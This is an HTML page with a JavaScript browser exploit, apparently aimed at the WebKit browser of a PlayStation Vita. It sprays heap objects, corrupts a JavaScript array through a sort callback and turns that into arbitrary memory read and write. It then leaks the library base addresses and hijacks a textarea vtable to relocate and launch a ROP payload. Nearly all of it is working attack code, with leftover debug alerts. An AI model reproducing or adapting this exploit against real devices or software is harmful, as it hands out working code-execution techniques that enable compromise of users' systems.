<script src="payload.js"></script>
<script>
// huge = new Uint32Array(64 * 1024 * 1024 / 4);
// mem = 0x83500000 + 0x1000; // a part of 'huge' will always be here so we can freely use this addr for tmp data

_dview = null;
// u2d/d2u taken from PSA-2013-0903
// wraps two uint32s into double precision
function u2d(low,hi)
{
	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setUint32(0,hi);
	_dview.setUint32(4,low);
	return _dview.getFloat64(0);	
}

function d2u(d)
{
	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setFloat64(0,d);
	return { low: _dview.getUint32(4), 
	         hi:  _dview.getUint32(0) };    
}

first = 0;
second = 0;


backup = new Uint32Array(0x400);

function read_mov_r12(addr) {
	first = u32[addr/4];
	second = u32[addr/4 + 1];
	return ((((first & 0xFFF) | ((first & 0xF0000) >> 4)) & 0xFFFF) | ((((second & 0xFFF) | ((second & 0xF0000) >> 4)) & 0xFFFF) << 16)) >>> 0;
}

// spray buffers/textareas/whatever
// interleave buffers and textareas

spray_size = 0x4000;

textareas = new Array(spray_size);
buffers = new Array(spray_size);
buffer_len = 0x1344;
textarea_cookie = 0x66656463;
textarea_cookie2 = 0x55555555;
for (var i = 0; i < buffers.length; ++i) {
	buffers[i] = new Uint32Array(buffer_len / 4);
	var e = document.createElement("textarea");
	e.rows = textarea_cookie;
	textareas[i] = e;
}

for (var i = 0; i < 0x400; ++i) {
	var e = document.createElement("textarea");
	e.rows = textarea_cookie;
	textareas.push(e);
}

alert("relocs");
var relocs = {};
var payload = rop_payload();
alert("csize: " + payload.csize.toString(16));
var almost_oversize = 0x3000;
var foo = Array.prototype.constructor.apply(null, new Array(almost_oversize));
var normal_length = 0x800;
var fu = new Array(normal_length);
var o = {};
var arrays = new Array(0x100);
o.toString = function () {
	foo.push(12345);
	for (var i = 0; i < arrays.length; ++i) {
		var bar = Array.prototype.constructor.apply(null, fu);
		bar[0] = 0;
		bar[1] = 1;
		bar[2] = 2;
		arrays[i] = bar;
	}
	return "";
}
foo[0] = o;
var len = u2d(0x80000000, 0x80000000);
for (var i = 1; i < 0x2000; ++i)
	foo[i] = len;
foo.sort();

contents = "";
cur = 0;

o.toString = function() {};

// find corrupted JSArray

var arr = null;

for (var i = 0; i < arrays.length; ++i) {
	if (arrays[i].length != normal_length) {
		arr = arrays[i];
		break;
	}
}

// use corrupted JSArray to corrupt a Uint32Array

// alert("fakelen? " + arr.length.toString(16) + " at " + i);
var start = 0x20000000-0x11000;
for(;; start--) {
	if (arr[start] != 0) {
		_dview.setFloat64(0, arr[start]);
		// alert(_dview.getUint32(4).toString(16) + " " + _dview.getUint32(0).toString(16));
		if (_dview.getUint32(0) == buffer_len / 4) {
			//alert(_dview.getUint32(4).toString(16) + " " + _dview.getUint32(0).toString(16));
			//alert("found something");
			_dview.setUint32(0, 0xEFFFFFE0);
			arr[start] = _dview.getFloat64(0); // buffer size

			_dview.setFloat64(0, arr[start-2]);
			heap_addr = _dview.getUint32(4); // leak some heap address
			//alert(_dview.getUint32(4).toString(16) + " " + _dview.getUint32(0).toString(16));;
			_dview.setUint32(4, 0)
			_dview.setUint32(0, 0x80000000);
			arr[start-2] = _dview.getFloat64(0); // buffer offset
			break;
		}
	}
}

// find corrupted Uint32Array
corrupted = null;
for (var i = 0; i < buffers.length; ++i) {
	if (buffers[i].byteLength != buffer_len) {
		corrupted = buffers[i];
		break;
	}
}
if (!corrupted) {
	alert("failed");
	while(1){}
}
// alert("corrupted buffer " + corrupted + " len " + corrupted.byteLength.toString(16));

// u32 = arbitrary rw
var u32 = corrupted;

var some_space = heap_addr;
// alert("heap addr 0x" + heap_addr.toString(16));
search_start = heap_addr;

for (var addr = search_start/4; addr < search_start/4 + 0x4000; ++addr) {
	if (u32[addr] == textarea_cookie) {
		// alert("Found textarea.rows at addr 0x" + (addr * 4).toString(16));
		u32[addr] = textarea_cookie2;
		textarea_addr = addr * 4;
		found_element = true;
		break;
	}
}

if (!found_element) {
	alert("Did not find Element signature");
	while(1){}
}

/*
	Change the rows of the Element object then scan the array of
	sprayed objects to find an object whose rows have been changed
*/
var found_corrupted = false;
var corrupted_textarea;
for (var i = 0; i < textareas.length; ++i) {
	if (textareas[i].rows == textarea_cookie2) {
		corrupted_textarea = textareas[i];
		// alert("Found corrupted textarea at index #" + i);
		found_corrupted = true;
		break;
	}
}
alert("asdf");
if (!found_corrupted) {
	alert("Did not find corrupted textarea");
	while(1){}
}

alert("hello");
var vtidx = textarea_addr - 0x70;
var textareavptr = u32[vtidx / 4];
 alert("Textarea vptr: 0x" + textareavptr.toString(16));

var wkbase = textareavptr - 0xabb65c;
 alert("wkbase: 0x" + wkbase.toString(16));

libcbase = read_mov_r12(wkbase + 0x85F504) - 0xfa49;
 alert("libcbase: 0x" + libcbase.toString(16));
alert("some_space: 0x" + some_space.toString(16));

// copy vtable
for (var i = 0; i < 0x40; i++)
	u32[some_space / 4 + i] = u32[textareavptr / 4 + i];

u32[vtidx / 4] = some_space;

// backup our obj
for (var i = 0; i < 0x30; ++i)
	backup[i] = u32[vtidx/4 + i];

// call setjmp and leak stack base
u32[some_space / 4 + 0x4e] = libcbase + 0x14070|1; // setjmp

corrupted_textarea.scrollLeft = 0; // call setjmp

sp = (u32[vtidx/4 + 8] ^ ((u32[vtidx/4 + 9] ^ (wkbase + 0x317929)) >>> 0)) >>> 0;
sp -= 0xFF708;
alert(sp.toString(16));

// restore our obj
for (var i = 0; i < 0x30; ++i)
	u32[vtidx/4 + i] = backup[i];

// function pointer
u32[some_space / 4 + 0x4e] = wkbase + 0x54c8; //54c8: e891a916 ldm r1, {r1, r2, r4, r8, fp, sp, pc}

// var sp = mem + 0x10000; // sp = 0x82610000

var ldm_data = some_space + 0x100;
u32[ldm_data/4 + 5] = sp + 0x10000;        // sp
u32[ldm_data/4 + 6] = wkbase + 0xc048a|1;  // pc = pop {pc}
 alert("setup ok");

relocs["SceWebKit"] = wkbase;
relocs["SceLibc"] = libcbase;
relocs["rop.data"] = (sp + 0x10000)+payload.csize;

alert("getting payload");

alert("asdf4");
    
var reloc_n = payload.reloc_size/8;

alert("reloc_n: " + reloc_n);

for (var i = 0; i < reloc_n; ++i)
{
    var type = payload.u16[payload.reloc_offset/2 + 4*i];
    var id = payload.u16[payload.reloc_offset/2 + 4*i + 1];
    var offset = payload.u32[payload.reloc_offset/4 + 2*i + 1];
    
    alert("offset: " + (offset/4).toString(16));
    alert("value at: " + payload.u32[offset/4].toString(16));
    
    if (type == 0)
    {
        alert("got reloc: " + payload.reloc_map[id].length.toString(16));
        alert("value:" + relocs[payload.reloc_map[id]]);
        payload.u32[offset/4] += relocs[payload.reloc_map[id]];
    }
    
    else if (type == 1)
    {
        payload.u32[offset/4] = relocs[payload.reloc_map[id]] - payload.u32[offset/4];
    }
    
    else if (type == 2)
    {
        payload.u32[offset/4] = payload.u32[offset/4] - relocs[payload.reloc_map[id]];
    }
    
    else if (type == 3)
    {
        payload.u32[offset/4] = relocs[payload.reloc_map[id]];
    }
    
    
    alert("value after: " + payload.u32[offset/4].toString(16));
}

var data_start = 0x40;
var data_end = data_start + payload.dsize;

alert("copying payload data.");

addr = (sp + 0x10000 + payload.csize)/4;

// copy data section
for (var i = data_start/4; i < data_end/4; ++i, ++addr)
{
    u32[addr] = payload.u32[i];
}

alert("copying payload code.");

var code_start = data_end;
var code_end = code_start + payload.csize;
addr = (sp + 0x10000)/4;

alert("begin copy");

// copy code section
for (var i = code_start/4; i < code_end/4; ++i, ++addr)
{
    var val = payload.u32[i];
    alert("i = " + i.toString(16));
    alert("copying: " + val.toString(16) + " to: " + ((addr)*4).toString(16));
    u32[addr] = val;
}

alert("trigger");

corrupted_textarea.scrollLeft = ldm_data; // trigger ropchain, r1=arg

alert("that's it");

</script>
